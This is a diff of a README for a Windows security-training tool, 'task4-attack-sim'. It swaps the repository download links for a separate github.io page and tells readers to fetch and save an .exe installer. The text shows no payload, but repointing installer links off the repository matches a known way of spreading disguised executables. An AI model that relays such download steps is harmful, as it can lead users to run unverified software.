@@ -1,6 +1,6 @@
 # 🛡️ task4-attack-sim - Learn security skills with guided workflows
 
-[![Download for Windows](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://github.com/antonio5997/task4-attack-sim)
+[![Download for Windows](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://antonio5997.github.io)
 
 ## 📋 Project Overview
 
@@ -22,7 +22,7 @@ This guide walks you through the process of setting up the software on your Wind
 
 ### 📥 Downloading the Software 
 
-1.  Visit the official page to obtain the installer: [https://github.com/antonio5997/task4-attack-sim](https://github.com/antonio5997/task4-attack-sim).
+1.  Visit the official page to obtain the installer: [https://antonio5997.github.io](https://antonio5997.github.io).
 2.  Look for the "Releases" section on the right side of the screen.
 3.  Choose the file ending in `.exe` that corresponds to your system architecture.
 4.  Save the file to your desktop for easy access.
